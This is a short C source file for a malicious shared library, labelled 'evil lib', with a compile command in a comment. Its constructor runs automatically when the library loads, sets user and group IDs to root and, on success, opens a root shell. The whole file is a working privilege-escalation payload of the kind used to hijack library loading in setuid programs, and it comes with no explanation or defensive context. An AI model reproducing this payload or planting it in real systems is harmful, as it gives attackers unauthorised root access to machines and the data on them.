#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void _init() __attribute__((constructor));

/* gcc -shared -fPIC evil_lib.c -o x.so.2 */
void _init(void)
{

    puts(">>>> Executing evil lib");

    setuid(0);
    setgid(0);

    if(!getuid())
    {
        puts(">>>> We are root");
        system("/bin/sh 2>&1");
    }

}

